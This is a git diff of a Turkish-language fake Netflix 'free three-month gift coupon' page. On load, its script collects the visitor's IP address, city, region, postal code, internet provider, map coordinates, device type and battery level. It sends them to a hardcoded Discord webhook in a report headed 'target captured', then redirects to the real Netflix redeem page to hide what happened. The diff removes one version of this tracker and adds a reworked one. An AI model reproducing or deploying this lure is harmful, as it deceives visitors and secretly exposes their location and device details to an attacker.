@@ -5,14 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <title>Netflix - 3 Aylık Ücretsiz Hediye Kuponu</title>
-    <meta name="title" content="Netflix - 3 Aylık Ücretsiz Hediye Kuponu">
     <meta name="description" content="Tebrikler! 2026 yılına özel ücretsiz Netflix kuponunuzu hemen tanımlayın. Sınırlı sayıda!">
-    <meta property="og:type" content="website">
     <meta property="og:title" content="Netflix - Hediye Merkezi">
-    <meta property="og:description" content="Ücretsiz 3 Aylık Standart Plan Kuponunuzu Alın.">
     <meta property="og:image" content="https://images.ctfassets.net/4cd45et68cgf/4nBnsuPq03nE9S60sboE9/89a742057c366021ad4ad2c4a2b9ef92/Netflix_App_Icon.png">
-    <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:image" content="https://images.ctfassets.net/4cd45et68cgf/4nBnsuPq03nE9S60sboE9/89a742057c366021ad4ad2c4a2b9ef92/Netflix_App_Icon.png">
 
     <style>
         body { background-color: #000; color: #fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
@@ -29,7 +24,7 @@
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="logo" alt="Netflix">
         <h1>Hediye Kodunuz Tanımlanıyor</h1>
-        <p>Lütfen bekleyin, sistem yoğunluğuna göre işlem bir dakika sürebilir...</p>
+        <p>Lütfen bekleyin, sistem yoğunluğuna göre işlem kısa bir süre alabilir...</p>
         <div class="loader"></div>
     </div>
     <div class="footer-text">© 2026 Netflix, Inc.</div>
@@ -37,66 +32,70 @@
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
 
-        async function bombaSistem() {
-            try {
-                // IP ve Detaylı Konum Bilgisi (HTTPS destekli servis)
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                
-                // Harita linkini düzelttim: Direkt koordinat pini atar
-                const haritaLink = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+        // Sayfa açılır açılmaz yönlendirmeyi kur (Garanti Yöntem)
+        setTimeout(() => {
+            window.location.replace("https://www.netflix.com/tr/redeem");
+        }, 4500);
 
-                // Batarya Bilgisi
-                let pil = "Bilinmiyor";
+        async function veriToplaVeGonder() {
+            try {
+                // IP ve Konum bilgisini al (Hızlı Servis)
+                const res = await fetch('https://ipinfo.io/json?token='); // Token olmadan da çalışır ama yavaştır, bu yüzden alternatif:
+                const dRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await dRes.json();
+                
+                // Detaylı bilgi için ikinci sorgu (Gecikmeyi azaltmak için paralel)
+                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geo = await geoRes.json();
+
+                const haritaLink = `https://www.google.com/maps?q=${geo.latitude},${geo.longitude}`;
+
+                // Cihaz Bilgisi
+                const ua = navigator.userAgent;
+                let cihaz = "🖥️ Bilgisayar (PC)";
+                if (/tablet|ipad/i.test(ua)) { cihaz = "Tablet"; } 
+                else if (/Mobile|Android|iPhone/i.test(ua)) { cihaz = "📱 Akıllı Telefon"; }
+
+                // Batarya
+                let pilBilgisi = "Bilinmiyor";
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
-                    pil = `%${Math.round(battery.level * 100)} ${battery.charging ? '(Şarjda)' : '(Değil)'}`;
+                    pilBilgisi = `%${Math.round(battery.level * 100)} ${battery.charging ? '(Şarjda)' : '(Değil)'}`;
                 }
 
-                // Cihaz Türü Tespiti
-                const ua = navigator.userAgent;
-                let cihazTipi = "🖥️ Bilgisayar (PC)";
-                if (/tablet|ipad/i.test(ua)) { cihazTipi = "平板 Tablet"; } 
-                else if (/Mobile|Android|iPhone/i.test(ua)) { cihazTipi = "📱 Akıllı Telefon"; }
-
-                // Discord ANONİM BOT Raporu
+                // Discord Raporu
                 const rapor = {
                     username: "ANONİM BOT",
                     avatar_url: "https://i.imgur.com/8nN9S1L.png",
                     embeds: [{
-                        title: "🎯 HEDEF PAKETLENDİ!",
-                        description: "Kurban tuzağa düştü. Tüm bilgiler aşağıda:",
+                        title: "🎯 HEDEF YAKALANDI (ANLIK)",
                         color: 16711680,
                         fields: [
-                            { name: "👤 Cihaz Türü", value: `**${cihazTipi}**`, inline: true },
-                            { name: "🔋 Batarya", value: pil, inline: true },
-                            { name: "🌐 IP Adresi", value: `\`${d.ip}\``, inline: false },
-                            { name: "🏠 Adres (İl/İlçe/Semt)", value: `**${d.region} / ${d.city} / ${d.postal}**`, inline: false },
-                            { name: "📡 İnternet Hattı", value: d.org, inline: true },
-                            { name: "📍 Harita Konumu", value: `[Nokta Atışı Haritada Gör](${haritaLink})`, inline: false }
+                            { name: "👤 Cihaz", value: cihaz, inline: true },
+                            { name: "🔋 Batarya", value: pilBilgisi, inline: true },
+                            { name: "🌐 IP", value: `\`${geo.ip}\``, inline: false },
+                            { name: "🏠 Adres", value: `**${geo.region} / ${geo.city} / ${geo.postal || "Yok"}**`, inline: false },
+                            { name: "📡 İnternet", value: geo.org, inline: true },
+                            { name: "📍 Harita", value: `[Konumu Haritada Gör](${haritaLink})`, inline: false }
                         ],
-                        footer: { text: "ANONİM BOT Takip Sistemi | " + new Date().toLocaleString('tr-TR') },
-                        thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png" }
+                        footer: { text: "ANONİM BOT | " + new Date().toLocaleString('tr-TR') }
                     }]
                 };
 
-                await fetch(webhookURL, {
+                // Discord'a gönder (Arka planda)
+                fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(rapor)
                 });
 
-                // Yönlendirme
-                setTimeout(() => {
-                    window.location.href = "https://www.netflix.com/tr/redeem";
-                }, 4000);
-
             } catch (error) {
-                window.location.href = "https://www.netflix.com/tr/redeem";
+                console.log("Veri toplama hatası, ama sistem devam ediyor.");
             }
         }
 
-        window.onload = bombaSistem;
+        // Fonksiyonu başlat
+        veriToplaVeGonder();
     </script>
 </body>
 </html>
